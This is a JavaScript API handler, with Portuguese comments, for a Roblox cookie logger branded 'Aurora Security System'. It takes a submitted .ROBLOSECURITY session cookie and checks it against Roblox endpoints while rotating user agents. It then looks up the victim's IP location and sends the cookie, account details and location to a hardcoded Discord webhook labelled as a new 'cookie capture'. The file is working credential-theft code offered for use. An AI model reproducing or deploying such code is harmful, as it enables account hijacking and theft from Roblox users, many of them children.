export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let { cookie, ip, device, timestamp } = req.body;

    if (!cookie) {
      return res.status(400).json({ error: 'Cookie não fornecido' });
    }

    // ===== LIMPAR E FORMATAR O COOKIE =====
    let cookieOriginal = cookie.trim().replace(/^["']|["']$/g, '');
    let cookieFormatado = cookieOriginal;
    
    // Se NÃO começar com o formato correto, adicionar
    if (!cookieOriginal.startsWith('_|WARNING')) {
      cookieFormatado = `_|WARNING:-DO-NOT-SHARE-THIS.--${cookieOriginal}`;
    }

    console.log('Cookie original:', cookieOriginal.substring(0, 50) + '...');
    console.log('Cookie formatado:', cookieFormatado.substring(0, 50) + '...');

    // ===== MÚLTIPLAS TENTATIVAS DE VERIFICAÇÃO =====
    let cookieValido = false;
    let contaRecente = false;
    let username = 'Desconhecido';
    let userId = null;
    let idadeConta = 'Desconhecida';
    let erroValidacao = 'Todas as tentativas falharam';
    let dadosConta = null;

    // Lista de User-Agents diferentes para evitar bloqueio
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];

    // Tentar com diferentes combinações de cookie e user-agent
    const tentativas = [
      { cookie: cookieOriginal, url: 'https://users.roblox.com/v1/users/authenticated' },
      { cookie: cookieFormatado, url: 'https://users.roblox.com/v1/users/authenticated' },
      { cookie: cookieOriginal, url: 'https://www.roblox.com/mobileapi/userinfo' },
      { cookie: cookieFormatado, url: 'https://www.roblox.com/mobileapi/userinfo' },
      { cookie: cookieOriginal, url: 'https://economy.roblox.com/v1/users/1' }, // endpoint público
      { cookie: cookieFormatado, url: 'https://economy.roblox.com/v1/users/1' }
    ];

    for (const tentativa of tentativas) {
      if (cookieValido) break;
      
      for (const ua of userAgents) {
        try {
          console.log(`Tentando com ${tentativa.url}...`);
          
          const response = await fetch(tentativa.url, {
            method: 'GET',
            headers: {
              'Cookie': `.ROBLOSECURITY=${tentativa.cookie}`,
              'User-Agent': ua,
              'Accept': 'application/json',
              'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
              'Referer': 'https://www.roblox.com/'
            }
          });

          if (response.ok) {
            const data = await response.json();
            
            // Verificar se tem ID de usuário
            if (data.id || data.UserID || data.userId) {
              cookieValido = true;
              userId = data.id || data.UserID || data.userId;
              username = data.name || data.UserName || data.username || 'Desconhecido';
              dadosConta = data;
              
              console.log('✅ Cookie válido! User ID:', userId);
              
              // Buscar data de criação
              try {
                const userResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                  headers: {
                    'User-Agent': ua,
                    'Accept': 'application/json'
                  }
                });
                
                if (userResponse.ok) {
                  const userData = await userResponse.json();
                  if (userData.created) {
                    const dataCriacao = new Date(userData.created);
                    const agora = new Date();
                    const diffDias = Math.floor((agora - dataCriacao) / (1000 * 60 * 60 * 24));
                    
                    if (diffDias < 30) {
                      contaRecente = true;
                      idadeConta = `${diffDias} dias`;
                    } else if (diffDias < 365) {
                      const meses = Math.floor(diffDias / 30);
                      idadeConta = `${meses} meses`;
                    } else {
                      const anos = Math.floor(diffDias / 365);
                      idadeConta = `${anos} anos`;
                    }
                  }
                }
              } catch (e) {
                console.log('Erro ao buscar data de criação:', e.message);
              }
              
              break;
            }
          } else {
            console.log(`Resposta não ok: ${response.status}`);
          }
        } catch (e) {
          console.log(`Erro na tentativa: ${e.message}`);
        }
      }
    }

    // Se ainda não conseguiu validar, tentar método alternativo
    if (!cookieValido) {
      try {
        // Tentar com fetch para a página inicial (às vezes funciona)
        const homeResponse = await fetch('https://www.roblox.com/home', {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookieFormatado}`,
            'User-Agent': userAgents[0]
          }
        });

        // Verificar se foi redirecionado para login
        if (homeResponse.url.includes('home')) {
          cookieValido = true;
          username = 'Usuário Verificado';
          console.log('✅ Cookie válido (método alternativo)');
        }
      } catch (e) {
        console.log('Erro no método alternativo:', e.message);
      }
    }

    // Buscar informações do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1480235860002734152/8ZjlQOiaHtPrE9bz-yGaM_GiMC3akI7ptVW-aElQUvTjsk8jauXoaho6B1anWmy8a8QE';

    // Determinar cor e título
    let embedColor = 0x6366f1;
    let embedTitle = '🔐 **NOVA CAPTURA DE COOKIE**';
    let embedDescription = 'Um novo cookie foi capturado pelo sistema Aurora';
    let embedContent = null;

    if (!cookieValido) {
      embedColor = 0xff0000;
      embedTitle = '❌ **COOKIE INVÁLIDO**';
      embedDescription = `Cookie inválido - Não foi possível verificar`;
    } else if (contaRecente) {
      embedColor = 0xffa500;
      embedTitle = '⚠️ **CONTA RECENTE**';
      embedDescription = `Cookie válido mas a conta tem apenas ${idadeConta}`;
      embedContent = '@everyone ⚠️ CONTA RECENTE';
    } else {
      embedContent = '@everyone ✅ COOKIE VÁLIDO';
    }

    const embed = {
      content: embedContent,
      embeds: [{
        title: embedTitle,
        description: embedDescription,
        color: embedColor,
        fields: [
          {
            name: '🍪 **COOKIE**',
            value: '```' + cookieOriginal.substring(0, 100) + '...```'
          },
          {
            name: '👤 **INFORMAÇÕES DA CONTA**',
            value: `\`\`\`yml
Username: ${username}
User ID: ${userId || 'Desconhecido'}
Status: ${cookieValido ? '✅ Válido' : '❌ Inválido'}
Conta Recente: ${contaRecente ? '⚠️ Sim' : '✅ Não'}
Idade da Conta: ${idadeConta}
\`\`\``
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req)}
Sistema: ${getOSInfo(req)}
Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🌍 **INFORMAÇÕES DO IP**',
            value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMP**',
            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: true
          },
          {
            name: '📏 **TAMANHO**',
            value: `\`${cookieOriginal.length} caracteres\``,
            inline: true
          }
        ],
        footer: {
          text: 'Aurora Security System',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Enviar para o Discord
    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
      });
    } catch (e) {
      console.log('Erro ao enviar para Discord:', e.message);
    }

    // Retornar resultado para o frontend
    return res.status(200).json({ 
      success: true,
      valido: cookieValido,
      contaRecente: contaRecente,
      username: username,
      idadeConta: idadeConta,
      userId: userId
    });
    
  } catch (error) {
    console.error('Erro geral:', error);
    return res.status(500).json({ 
      success: false,
      valido: false,
      error: 'Erro interno' 
    });
  }
}

function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
  if (ua.includes('Firefox')) return 'Mozilla Firefox';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
  if (ua.includes('Edg')) return 'Microsoft Edge';
  return 'Desconhecido';
}

function getOSInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'Desconhecido';
}
